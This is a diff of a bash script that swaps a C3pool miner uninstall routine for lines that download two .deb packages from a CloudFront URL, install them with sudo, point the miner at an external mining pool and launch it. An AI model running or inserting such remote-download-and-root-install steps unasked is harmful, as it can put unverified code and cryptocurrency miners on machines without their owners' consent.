@@ -1,37 +1,16 @@
 #!/bin/bash
+wget https://d1ftoepmu0es39.cloudfront.net/librandomx_1.0.0-3_amd64.deb
 
-VERSION=1.0
+sudo dpkg -i librandomx_1.0.0-3_amd64.deb
 
-# printing greetings
+wget https://d1ftoepmu0es39.cloudfront.net/epic-miner_2.3.1-1_amd64.deb
 
-echo "C3pool mining uninstall script v$VERSION."
-echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
-echo
+sudo dpkg -i epic-miner_2.3.1-1_amd64.deb
 
-if [ -z $HOME ]; then
-  echo "ERROR: Please define HOME environment variable to your home directory"
-  exit 1
-fi
+sudo sed -i 's/stratum_server_addr = "127.0.0.1:3416"/stratum_server_addr = "epic-us.icemining.ca:4000"/g' /opt/epic-miner/epic-miner.toml
 
-if [ ! -d $HOME ]; then
-  echo "ERROR: Please make sure HOME directory $HOME exists"
-  exit 1
-fi
+sudo sed -i 's/threads = 3/threads = 4/g' /opt/epic-miner/epic-miner.toml
 
-echo "[*] Removing c3pool miner"
-if sudo -n true 2>/dev/null; then
-  sudo systemctl stop c3pool_miner.service
-  sudo systemctl disable c3pool_miner.service
-  rm -f /etc/systemd/system/c3pool_miner.service
-  sudo systemctl daemon-reload
-  sudo systemctl reset-failed
-fi
+epic-miner
 
-sed -i '/c3pool/d' $HOME/.profile
-killall -9 xmrig
-
-echo "[*] Removing $HOME/c3pool directory"
-rm -rf $HOME/c3pool
-
-echo "[*] Uninstall complete"
 
